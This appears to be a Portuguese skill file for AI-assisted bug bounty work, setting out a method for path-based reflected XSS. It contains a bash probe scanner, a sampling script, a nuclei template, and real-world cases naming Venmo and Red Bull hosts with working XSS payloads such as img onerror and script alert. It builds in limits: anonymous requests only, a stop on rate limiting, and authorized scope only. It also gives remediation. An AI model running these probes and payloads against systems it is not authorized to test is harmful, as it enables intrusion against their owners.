---
name: path-based-xss
description: Metodologia de XSS refletido no CAMINHO da URL (path-based XSS), para bug bounty e pentest autorizado. Diferente do XSS por parâmetro, aqui o payload vai nos SEGMENTOS DO PATH ou logo após um "?" colado no path, e o reflexo quase sempre vem de uma PÁGINA DE ERRO que imprime o caminho requisitado dentro do HTML sem escapar. Use quando o alvo tiver paths conhecidos e o usuário mencionar "path based xss", "xss no path", "injectable", "xss em 404", "basic xss prober". O marcador é '"><injectable> percent-encoded (%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e) e a confirmação exige três condições juntas: o marcador refletido EXATO no corpo, Content-Type text/html e status 200, 404, 403, 500, 503 ou 307 — o 302 não vale. USA APENAS TRÊS PAYLOADS, para manter o volume de requisição baixo: P3 = ?'"><injectable> (força query string onde a rota não a espera — o mais barato e o que mais rende, testar primeiro), P2 = ⓐ'"><injectable> (um único caractere não-ASCII) e P1 = Zalgo + '"><injectable> (sequências combinantes que estressam normalização e comprimento). Cada um é testado COM e SEM a barra antes, dando 6 requisições por nível de path; e a escalada percorre NÍVEL A NÍVEL do path até a raiz (/a/b/c, depois /a/b, depois /a, depois /), porque cada prefixo pode ser servido por um handler diferente. Os demais prefixos unicode (cirílico, emoji ZWJ, coreano, colchetes, pontos, exclamações, kaomoji) foram removidos de propósito: cobrem o mesmo mecanismo e só multiplicam o custo. LIMITES OBRIGATÓRIOS por ser a skill que mais gasta requisição: rodar SEMPRE POR ÚLTIMO, depois de todas as outras; PARAR NA HORA ao ver 429 (WAF barrando); nunca testar duas vezes o mesmo path; testar SOMENTE páginas acessíveis sem autenticação — o script nunca envia cookie nem Authorization, e aborta se houver variável de sessão no ambiente; e testar SOMENTE paths cujo Content-Type é text/html, verificado com UMA requisição de baseline por nível que descarta as 6 do probe quando o path não é HTML; e em alvos com milhares de URLs, NORMALIZAR POR TEMPLATE antes de escanear — substituindo IDs numéricos, UUIDs, hashes e slugs por marcadores ({N}, {UUID}, {HASH}, {SLUG}), agrupando as URLs por template e com AMOSTRAGEM ESCALONADA por tamanho do grupo — até 15 URLs testa todas, 16-50 testa 10, 51-300 testa 5, acima de 300 testa 3 — e DOBRO de amostras para prefixos de alto valor (admin, internal, debug, config, manage, console, backoffice, painel, dashboard, cms, portal, private, secure, test, dev), que ainda são processados primeiro para que o teto global nunca os exclua; teto global de 60 paths por host, excluindo estáticos e parando após 2 templates seguidos sem sinal; o script de normalização acompanha a skill, e o dedup por prefixo faz os níveis compartilhados (/us e raiz) serem testados uma vez só — na prática um /admin/ com 30 páginas é coberto quase inteiro enquanto 28 mil URLs de /us/produto/ viram 3 amostras, e 10 mil URLs no total viram algumas centenas de requisições em vez de 60 mil. Só usar dentro do escopo formalmente autorizado.
---

# Path-Based XSS

XSS em que o payload vai no **caminho** da URL — não em parâmetro — e o reflexo
costuma vir de uma **página de erro** que imprime o caminho requisitado dentro
do HTML sem escapar.

**Pré-condição obrigatória**: só use dentro do escopo formalmente autorizado.

## 0. LIMITES — leia antes de disparar a primeira requisição

Esta é, de longe, a skill que **mais consome requisição**. Sem os limites
abaixo ela vira varredura infinita, queima o IP no WAF e não entrega nada.

### 0.1 Rode SEMPRE por último

Execute esta skill **depois** de todas as outras do engajamento. Ela gera
ordens de magnitude mais tráfego do que qualquer outra, e um bloqueio de WAF
aqui inviabiliza os testes que ainda faltariam.

### 0.2 429 = pare na hora

**Se a aplicação começar a devolver 429 com frequência, interrompa
imediatamente.** É o WAF barrando; continuar só confirma o bloqueio, entope o
log do alvo e não produz achado.

```bash
if [ "$CODE" = "429" ]; then
  N429=$((N429+1))
  [ "$N429" -ge 3 ] && { echo ">>> 429 recorrente — ABORTANDO"; break; }
fi
```

Três 429 seguidos já é sinal suficiente. Não espere acumular dezenas.

### 0.3 Só em páginas NÃO autenticadas — e só HTML

Duas travas, ambas obrigatórias.

**Trava 1 — nenhuma sessão, nunca.** O script **jamais** envia `-b`,
`--cookie`, `Cookie:` ou `Authorization`. As requisições saem anônimas por
construção. Se você está navegando autenticado, **não rode esta skill**: a
superfície pré-autenticação é a que importa aqui, e testar logado gasta
requisição, polui o estado da conta e pode disparar ações indevidas.

Guarda explícita no início do script — aborte se algum jar de sessão estiver
configurado:

```bash
[ -n "$COOKIE" ] || [ -n "$COOKIE_JAR" ] || [ -n "$AUTH" ] && {
  echo ">>> variavel de sessao definida no ambiente — ABORTANDO"
  echo ">>> esta skill roda SOMENTE anonima"
  exit 1
}
```

**Trava 2 — só páginas cujo Content-Type é HTML.** Antes de gastar as 6
requisições de um nível, faça **uma** requisição de baseline e confirme:

```bash
CT=$(curl -sk --path-as-is -o /dev/null -D - -w '' "$HOST$P" | grep -i '^content-type:')
echo "$CT" | grep -qi 'text/html' || return    # nao e HTML -> pula o nivel inteiro
```

Uma requisição descarta seis. Em alvo com muitas rotas de API JSON, isso sozinho
corta a maior parte do tráfego.

**Ressalva honesta:** um path cujo baseline é `application/json` **pode** ter
uma página de erro em HTML — é justamente o mecanismo da seção 1. O pré-filtro
troca um pouco de cobertura por bastante economia. Se o alvo for pequeno e você
quiser cobertura máxima, desligue a trava 2 e confie só na checagem de
`text/html` da **resposta do probe**, que continua valendo sempre.

### 0.4 Nunca repita um path

Mantenha registro do que já foi testado e **não teste duas vezes**. Guarde por
path normalizado + posição:

```
tested.txt:   /cms/software/portal|fim
              /cms/software/portal|barra
              /cms/software/portal|interrogacao
```

Antes de disparar, cheque a lista. Se já está lá, pule.

### 0.5 Alvo com milhares de URLs — amostre, não varra

Se o alvo tem `site.com/us/*` com dez mil URLs, **não teste todas**. Elas quase
sempre compartilham o mesmo template e o mesmo handler de erro — testar dez mil
produz exatamente o mesmo resultado que testar duas.

**Normalize por template**, substituindo o que varia:

```
/us/produto/12345         ->  /us/produto/{N}
/us/produto/98761         ->  /us/produto/{N}      mesmo template
/us/blog/como-fazer-x     ->  /us/blog/{SLUG}
/us/user/a3f8-4c1b-...    ->  /us/user/{UUID}
/us/img/9f8a7b6c5d.png    ->  /us/img/{HASH}.png
```

**A amostragem é ESCALONADA, não fixa.** Um grupo pequeno é testado inteiro; só
grupo grande é amostrado. Testar 2 de 30 páginas de `/admin/` seria perder
cobertura de graça; testar 2 de 30 mil páginas de `/us/produto/` é o certo.

| Tamanho do template | Quantas testar |
|---|---|
| até 15 URLs | **todas** |
| 16 a 50 | 10 |
| 51 a 300 | 5 |
| mais de 300 | 3 |

**Prefixos de alto valor recebem o dobro** (limitado ao tamanho do grupo), e são
processados **primeiro**, para que o teto global nunca os deixe de fora:

```
admin  internal  debug  config  manage  console  backoffice
painel  dashboard  cms  portal  sistema  private  secure  test  dev
```

| Regra | Valor |
|---|---|
| Teto global por host | **60 paths** |
| Ordem | prefixos de alto valor primeiro |
| Parada por esgotamento | 2 templates seguidos sem nenhum sinal |

**Script de normalização e amostragem** — rode isto ANTES do scanner:

```bash
# entrada: urls.txt (uma URL por linha, do crawler/JS/trafego)
python3 - <<'EOF' > paths_a_testar.txt
import re, sys
from collections import OrderedDict
from urllib.parse import urlsplit

TETO_GLOBAL = 60
ESTATICOS = re.compile(r'\.(png|jpe?g|gif|svg|ico|css|js|woff2?|ttf|eot|mp4|webm|pdf)$', re.I)
VALIOSOS  = ('admin','internal','debug','config','manage','console','backoffice',
             'painel','dashboard','cms','portal','sistema','private','secure','test','dev')

def template(path):
    segs = []
    for x in path.strip('/').split('/'):
        if not x:                                    continue
        if re.fullmatch(r'\d+', x):                  segs.append('{N}')
        elif re.fullmatch(r'[0-9a-f]{8}-[0-9a-f-]{27,}', x, re.I): segs.append('{UUID}')
        elif re.fullmatch(r'[0-9a-f]{16,}', x, re.I): segs.append('{HASH}')
        elif re.search(r'\d', x) and len(x) > 12:     segs.append('{ID}')
        elif '-' in x and len(x) > 20:                segs.append('{SLUG}')
        else:                                         segs.append(x)
    return '/' + '/'.join(segs)

def quantas(n, valioso):
    if   n <= 15: base = n
    elif n <= 50: base = 10
    elif n <= 300:base = 5
    else:         base = 3
    return min(n, base * 2) if valioso else base

def eh_valioso(tpl):
    return any(v in tpl.lower() for v in VALIOSOS)

grupos = OrderedDict()
for line in open('urls.txt'):
    u = line.strip()
    if not u: continue
    path = urlsplit(u).path if '://' in u else u
    if ESTATICOS.search(path): continue
    grupos.setdefault(template(path), []).append(path)

# prefixos valiosos primeiro -> o teto global nunca os corta
ordenados = sorted(grupos.items(), key=lambda kv: (not eh_valioso(kv[0]), -len(kv[1])))

total = 0
for tpl, paths in ordenados:
    if total >= TETO_GLOBAL: break
    val = eh_valioso(tpl)
    n   = quantas(len(paths), val)
    vistos = []
    for pth in paths:
        if pth in vistos: continue
        vistos.append(pth); print(pth); total += 1
        if len(vistos) >= n or total >= TETO_GLOBAL: break
    print(f"# {tpl}  grupo={len(paths)}  testados={len(vistos)}"
          f"{'  [ALTO VALOR]' if val else ''}", file=sys.stderr)

print(f"# TOTAL: {len(grupos)} templates -> {total} paths", file=sys.stderr)
EOF
```

**Como isso se comporta na prática:**

```
/admin/{SLUG}        30 URLs  -> ALTO VALOR, grupo 16-50 -> 10 x2 = 20 testados
/admin/users/{N}      8 URLs  -> ALTO VALOR, grupo <=15  ->  8 testados (todas)
/us/produto/{N}   28.000 URLs -> comum,      grupo >300  ->  3 testados
/us/blog/{SLUG}    1.200 URLs -> comum,      grupo >300  ->  3 testados
/suporte/faq          6 URLs  -> comum,      grupo <=15  ->  6 testados (todas)
```

O `/admin/` com 30 páginas é coberto quase inteiro; os 28 mil produtos viram 3.

Depois é só alimentar o scanner:

```bash
while read PATHBASE; do
  CUR="$PATHBASE"
  while [ -n "$CUR" ]; do roda_nivel "$CUR"; CUR="${CUR%/*}"; done
done < paths_a_testar.txt
roda_nivel ""     # raiz, uma vez so
```

**O dedup de prefixo economiza mais do que parece.** Testando `/us/a`, `/us/b`
e `/us/c`, os níveis `/us` e a raiz são testados **uma vez só** — o `tested.txt`
bloqueia a repetição. Três paths irmãos custam 6+6+6 no nível folha, mais 6 do
`/us` e 6 da raiz. Não 3 × 18.

**Exemplo real de redução:**

```
10.000 URLs em /us/*
   -> normalizacao: 12 templates distintos
   -> amostragem:   24 paths (2 por template)
   -> teto global:  24 (abaixo de 40, tudo passa)
   -> pre-filtro Content-Type descarta ~8 (rotas de API)
   -> ~16 paths x 6 requisicoes + niveis compartilhados
   = cerca de 130 requisicoes, nao 60.000
```

## 1. A ideia central

```
   GET /caminho/qualquer'"><injectable>
                    |
                    v
   a aplicação não sabe rotear isso
                    |
                    v
   cai no HANDLER DE ERRO (404, 500, 403...)
                    |
                    v
   o handler imprime o CAMINHO REQUISITADO na página de erro
   "Página /caminho/qualquer'"><injectable> não encontrada"
                    |
                    v
   sem escapar  ->  XSS
```

**Por isso a página de erro é o alvo, não a página de sucesso.** Quem escreve o
template de erro raramente pensa que o caminho é entrada do usuário.

Duas consequências práticas:

1. **Um path que responde 404 não é motivo para parar** — é justamente onde o
   bug costuma estar.
2. **Não é preciso existir parâmetro nenhum.** Aplicações sem query string
   também são alvo.

## 2. O marcador

```
'"><injectable>
```

Percent-encoded, que é a forma que sobrevive ao trânsito:

```
%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e
```

Tem aspa simples, aspa dupla, `>` e `<` — tudo que importa — e `injectable` é
único e fácil de localizar. É **inerte**: não executa nada.

**Confirmação exige as três condições juntas:**

| Condição | Verificação |
|---|---|
| Marcador refletido | corpo contém `'"><injectable>` **exato** |
| É HTML | header contém `text/html` |
| Status válido | `200`, `404`, `403`, `500`, `503` ou `307` |

**O `302` não vale.** Redirect não renderiza HTML no navegador — o payload não
executa. O `307` alerta; o `302` não. Se o reflexo só aparece num 302,
registre como observação, não como XSS.

## 3. Os três payloads — e só eles

Para manter o volume de requisição baixo, a skill usa **três payloads**, não
uma lista longa de variantes. Cada um cobre um mecanismo diferente:

```
P1  <ZALGO>'"><injectable>     quebra o parser por sequências combinantes
P2  ⓐ'"><injectable>            caractere fora do ASCII, mínimo e barato
P3  ?'"><injectable>            força query string onde a rota não espera
```

Onde `<ZALGO>` é:

```
Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣
```

Percent-encoded, as três formas prontas:

```
P1  <ZALGO>%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e
P2  ⓐ%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e
P3  ?%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e
```

### 3.1 Cada payload, com e sem a barra

**Regra fixa: teste os três antes e depois da barra.** São duas formas por
payload, e a discrepância de parsing costuma estar exatamente aí.

Dado `site.com/admin/portal`:

```
SEM barra                              COM barra
site.com/admin/portal<ZALGO>'"><inj>   site.com/admin/portal/<ZALGO>'"><inj>
site.com/admin/portalⓐ'"><inj>         site.com/admin/portal/ⓐ'"><inj>
site.com/admin/portal?'"><inj>         site.com/admin/portal/?'"><inj>
```

**6 requisições por nível de path.** É o orçamento — não amplie.

### 3.2 Por que estes três

- **Zalgo** — sequências combinantes estressam normalização, comprimento e
  codificação. É o que empurra a aplicação para um handler de erro **diferente**
  do 404 comum, onde o path costuma ser impresso cru.
- **ⓐ** — o mesmo efeito com custo mínimo: um único caractere não-ASCII já
  basta em muitos parsers, e a URL fica curta e legível no report.
- **`?`** — não é ruído, é semântica: força query string numa rota que não a
  espera. Foi o que destravou os casos do Red Bull e do `/status` (seção 5).
  **É o que mais rende dos três.**

Os demais prefixos (cirílico, emoji ZWJ, coreano, colchetes, pontos,
exclamações, kaomoji, alfanuméricos circundados) foram **removidos de
propósito**: cobrem o mesmo mecanismo do Zalgo e do ⓐ, multiplicando o custo
sem ampliar a cobertura real.

## 4. Escalada por nível de path

**Teste cada nível, da folha até a raiz** — cada prefixo pode ser servido por
um handler diferente (rota da SPA, servidor de estáticos, gateway, handler
padrão do framework). Só um deles precisa imprimir o path cru.

Dado `site.com/cms/software/portal/cms`, com os 3 payloads × 2 formas:

```
nível 4:  /cms/software/portal/cms   +  P1 P2 P3, com e sem barra   (6 req)
nível 3:  /cms/software/portal       +  P1 P2 P3, com e sem barra   (6 req)
nível 2:  /cms/software              +  P1 P2 P3, com e sem barra   (6 req)
nível 1:  /cms                       +  P1 P2 P3, com e sem barra   (6 req)
raiz:     /                          +  P1 P2 P3, com e sem barra   (6 req)
```

**Orçamento:** 6 × (número de níveis + 1). Um path de 4 níveis custa 30
requisições. Com o teto de 30-50 paths por host (seção 0.5), isso já é volume
alto — por isso a amostragem por template não é opcional.

## 5. Casos reais

### 5.1 Venmo — a extensão `.html` foi o que destravou

```
https://api.us-east-1.load.live.venmo.com/health
→ sem XSS

https://api.us-east-1.load.live.venmo.com/health.html'%22%3E%3Cimg%20src=%22x%22%20onerror=confirm(document.domain)%3E
→ XSS
```

**Lição:** o path base não refletia; anexar `.html` mudou o caminho de código e
o handler de erro dessa rota imprimia o path cru. Sempre teste a variante com
extensão (seção 3.1).

### 5.2 Red Bull — o `?` colado quebrou o fluxo

```
https://turntable.redbull.tv/test        → sem reflexão
https://turntable.redbull.tv/test/       → sem reflexão

https://turntable.redbull.tv/test?wwwww%22%3E%3Cscript%3Ealert(1)%3C/script%3E
→ XSS
```

O path `/test` foi encontrado durante o recon. Sem o `?`, nada. **Ao colar o
`?` no começo, a aplicação dá um erro — e nesse erro vem o output do payload
numa página HTML.**

**Lição:** duas formas do mesmo path deram negativo e a terceira deu positivo.
Nunca conclua "não tem XSS" tendo testado só o path puro.

### 5.3 O prefixo de ruído em `/BUILD`

```
https://site.com/login?redirect=%2F
→ nada

https://site.com/BUILD/<Zalgo percent-encoded>'"><injectable>
→ XSS refletido na página HTML de erro
```

O path `/BUILD` foi encontrado **no corpo da página** durante o recon — não era
linkado. Com o prefixo Zalgo, o fluxo quebrou e a mensagem de erro trouxe o
payload.

**Lição:** paths achados no corpo do HTML e nos bundles JS (skill `bughunter`)
são alvos de primeira. E quando o marcador simples não reflete, o prefixo de
quebra é o segundo round.

### 5.4 Onde o XSS NÃO estava

```
site.com/status'"><injectable>       → nada
site.com/status/'"><injectable>      → nada
site.com/status?'"><injectable>      → XSS
```

Mesmo padrão do Red Bull. **A posição do `?` é decisiva** — e é a que mais
gente esquece de testar.

## 6. Fluxo de execução

```
0. CHECAR OS LIMITES DA SEÇÃO 0
   |__ é a última skill do engajamento?
   |__ estou fora de sessão autenticada?
   |__ lista de paths deduplicada e amostrada por template?
                    |
1. Coletar paths: corpo do HTML, bundles JS (bughunter), tráfego capturado
2. Normalizar por template e amostrar — teto de 30-50 paths (0.5)
3. Para cada path, subindo nível a nível até a raiz:
   |__ P3 (?)      com e sem barra    <- comece por aqui, e o que mais rende
   |__ P2 (ⓐ)      com e sem barra
   |__ P1 (Zalgo)  com e sem barra
4. Refletiu? confirmar as 3 condições (seção 2) -> ACHADO
5. Monitorar 429 o tempo todo -> 3 seguidos = ABORTA
```

**Ordem importa para economizar:** o `?` é o mais barato e o de maior taxa de
acerto — se ele resolver, você nem chega no Zalgo. Um path que não reflete em
nenhum dos três não vai refletir em variante nenhuma; siga adiante.

## 7. Script

```bash
# ---- TRAVA 1: esta skill roda SOMENTE anonima ----
if [ -n "$COOKIE" ] || [ -n "$COOKIE_JAR" ] || [ -n "$AUTH" ]; then
  echo ">>> variavel de sessao definida no ambiente — ABORTANDO"
  echo ">>> path-based-xss roda SOMENTE sem autenticacao"
  exit 1
fi

MARK="%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e"
ZALGO="Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/107.0"
HOST="https://alvo.com"
N429=0
: > tested.txt

testa() {
  local U="$1" TAG="$2"
  grep -qxF "$TAG" tested.txt && return          # 0.4 - nunca repete
  echo "$TAG" >> tested.txt

  # SEM -b, SEM --cookie, SEM Authorization. Anonimo por construcao.
  local R
  R=$(curl -sk --path-as-is -G --max-time 15 -A "$UA" \
       -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
       -o /tmp/p.html -D /tmp/p.hdr -w '%{http_code}' "$U")

  if [ "$R" = "429" ]; then
    N429=$((N429+1))
    [ "$N429" -ge 3 ] && { echo ">>> 429 recorrente — ABORTANDO"; exit 1; }
    return
  fi
  N429=0

  case "$R" in 200|404|403|500|503|307) ;; *) return ;; esac   # 302 nao vale
  grep -qi 'text/html' /tmp/p.hdr || return                    # so HTML conta
  if grep -qaF "'\"><injectable>" /tmp/p.html; then
    echo ">>> REFLETIDO [$R]  $U"
    cp /tmp/p.html "achado_$(date +%s%N).html"
  fi
  sleep 1
}

# ---- TRAVA 2: 1 requisicao de baseline decide se vale gastar as 6 ----
eh_html() {
  local P="$1"
  curl -sk --path-as-is -o /dev/null -D /tmp/b.hdr --max-time 15 -A "$UA" "${HOST}${P}/"
  grep -i '^content-type:' /tmp/b.hdr | grep -qi 'text/html'
}

# 3 payloads x 2 formas (com e sem barra) = 6 por nivel
roda_nivel() {
  local P="$1"
  if ! eh_html "$P"; then
    echo "[skip] $P/  (Content-Type nao e text/html)"
    return
  fi
  testa "${HOST}${P}?${MARK}"           "${P}|q|sembarra"      # P3 - o que mais rende
  testa "${HOST}${P}/?${MARK}"          "${P}|q|combarra"
  testa "${HOST}${P}ⓐ${MARK}"           "${P}|a|sembarra"      # P2
  testa "${HOST}${P}/ⓐ${MARK}"          "${P}|a|combarra"
  testa "${HOST}${P}${ZALGO}${MARK}"    "${P}|z|sembarra"      # P1
  testa "${HOST}${P}/${ZALGO}${MARK}"   "${P}|z|combarra"
}

# sobe nivel a nivel ate a raiz
for PATHBASE in "/app/cms" "/admin/portal"; do
  CUR="$PATHBASE"
  while [ -n "$CUR" ]; do
    roda_nivel "$CUR"
    CUR="${CUR%/*}"
  done
  roda_nivel ""      # raiz
done
```

**Custo:** 1 requisição de baseline + 6 de probe por nível — e a de baseline
descarta as 6 quando o path não é HTML. O `curl -G` faz o encoding do Zalgo
automaticamente; o `--path-as-is` impede a normalização do path no cliente.

## 8. Template nuclei

Versão enxuta — só os três payloads, com e sem barra:

```yaml
id: path-based-xss-probe
info:
  name: Path-Based XSS Probe (3 payloads)
  author: nadino,geeknik (original), reduzido
  severity: low
  tags: xss,path,generic

requests:
  - method: GET
    path:
      # P3 - "?" (o que mais rende)
      - '{{BaseURL}}?%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e'
      - '{{BaseURL}}/?%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e'
      # P2 - ⓐ
      - '{{BaseURL}}ⓐ%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e'
      - '{{BaseURL}}/ⓐ%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e'
      # P1 - Zalgo
      - '{{BaseURL}}Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e'
      - '{{BaseURL}}/Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e'
    headers:
      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/107.0"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
      Accept-Encoding: "gzip, deflate, br"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "'\"><injectable>"

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
          - 500
          - 404
          - 307
          - 403
```

**Ao adaptar:** o `{{BaseURL}}` do nuclei é a raiz. Para cobrir os níveis
intermediários (seção 4), rode o template com cada prefixo como BaseURL, ou use
o script da seção 7.

## 9. Confirmação e PoC

O marcador refletido é a **detecção**. Para o PoC, substitua por um payload que
o navegador execute no contexto observado:

```
'"><img src=x onerror=confirm(document.domain)>
'"><script>alert(document.domain)</script>
```

Percent-encode e abra **no navegador**, não no curl — o que importa é a
execução real. Tire print do alert mostrando a origem.

**Falso positivo a descartar:** o marcador refletido dentro de um comentário
HTML, de um `<textarea>`, de um atributo já escapado, ou em `Content-Type` que
não seja `text/html`. Confirme no navegador antes de reportar.

## 10. Reportar

1. URL completa do PoC, pronta para colar no navegador.
2. Print do `confirm(document.domain)` mostrando a origem.
3. O status code e o `Content-Type` da resposta — mostra que é HTML renderizado.
4. Se a reflexão vem de página de erro, diga isso: ajuda o time a achar o
   template responsável.
5. Diga qual posição funcionou (fim, barra, `?`, extensão) — é o que torna o
   report reproduzível.
6. Remediação: escapar o caminho requisitado ao renderizá-lo em qualquer
   template, especialmente nas páginas de erro.

## 11. Checklist

- [ ] Esta skill está sendo rodada **por último** no engajamento (0.1).
- [ ] Nenhum cookie/`Authorization` no script — requisições anônimas por construção.
- [ ] Guarda de ambiente ativa: aborta se `$COOKIE`/`$COOKIE_JAR`/`$AUTH` existir.
- [ ] Pré-filtro de Content-Type rodando: path que não é `text/html` é pulado inteiro.
- [ ] Normalização por template rodada ANTES do scanner (script da 0.5).
- [ ] Amostragem ESCALONADA aplicada: grupo até 15 testa todas, 16-50 testa 10,
      51-300 testa 5, acima de 300 testa 3.
- [ ] Prefixos de alto valor (admin, internal, debug, painel…) com dobro de
      amostras e processados primeiro.
- [ ] Teto global de 60 paths por host.
- [ ] Estáticos (`.png`, `.css`, `.js`, fontes) excluídos da lista.
- [ ] Parada após 2 templates seguidos sem nenhum sinal.
- [ ] Monitor de 429 ativo — 3 seguidos abortam (0.2).
- [ ] Apenas os TRÊS payloads usados: `?`, `ⓐ`, Zalgo — nenhuma variante extra.
- [ ] Testado em **todos os níveis** do path, da folha até a raiz (seção 4).
- [ ] `?` testado primeiro em cada nível — é o mais barato e o que mais rende.
- [ ] Cada payload testado COM e SEM a barra (6 requisições por nível).
- [ ] Confirmação com as TRÊS condições: marcador exato + `text/html` + status válido.
- [ ] `302` não aceito como achado.
- [ ] PoC validado **no navegador**, não só no curl.
- [ ] Falso positivo descartado (comentário, textarea, atributo escapado).
